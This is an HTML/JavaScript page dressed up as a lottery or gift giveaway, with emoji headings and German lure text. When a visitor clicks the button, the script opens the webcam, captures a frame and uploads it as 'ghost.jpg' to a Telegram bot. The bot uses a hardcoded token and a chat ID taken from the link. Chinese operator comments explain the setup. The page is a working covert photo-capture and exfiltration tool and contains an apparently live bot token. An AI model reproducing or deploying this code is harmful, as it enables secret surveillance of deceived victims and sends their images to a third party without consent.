<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁🎁🎁🎁🎁</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #1a1a1a; color: white; }
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; }
        #status { margin: 15px 0; font-weight: bold; color: #00ff00; }
        button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <h2>🧧🧧🧧🧧🧧</h2>
    <div id="status">💶💶💶💶💶</div>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">Offen💰</button>

    <script>
        // 【仅需填写此处】请填入你的完整 Bot Token
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) {
                status.innerText = "错误：未发现用户 ID，请先通过 Telegram 机器人发送 /start 获取链接！";
                return;
            }
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                startBtn.style.display = 'none';
                status.innerText = "🎲Die Lotterie läuft🎲...";
                setTimeout(captureAndUpload, 1500);
            } catch (err) {
                status.innerText = "扫描失败：请确保已允许摄像头权限。";
            }
        });

        function captureAndUpload() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            status.innerText = "🎉🎉🎉🎉🎉";
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'ghost.jpg');
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    status.innerText = result.ok ? "💔💔💔💔💔" : "回传失败：" + result.description;
                } catch (err) {
                    status.innerText = "网络连接错误。";
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
